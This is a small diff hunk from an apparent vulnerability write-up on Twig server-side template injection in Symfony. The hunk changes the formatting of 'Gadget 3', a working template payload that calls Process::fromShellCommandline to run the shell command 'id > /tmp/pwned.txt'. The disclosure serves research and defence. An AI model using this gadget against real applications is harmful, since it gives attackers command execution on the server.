@@ -166,7 +166,7 @@ Using `\Symfony\Component\VarDumper\Vardumper::setHandler()` and `\Symfony\Compo
 #### Gadget 3: 
 Using `\Symfony\Component\Process\Process::fromShellCommandline()` to invoke `proc_open("id > /tmp/pwned.txt")`:
 
-`{{ {'/':'id > /tmp/pwned.txt'} | map(['\\Symfony\\Component\\Process\\Process', 'fromShellCommandline']) | map(e => e.run()) | length }}`
+{{ {'/':'id > /tmp/pwned.txt'} | map(['\\Symfony\\Component\\Process\\Process', 'fromShellCommandline']) | map(e => e.run()) | length }}
 
 
 ### Exploit Conditions:
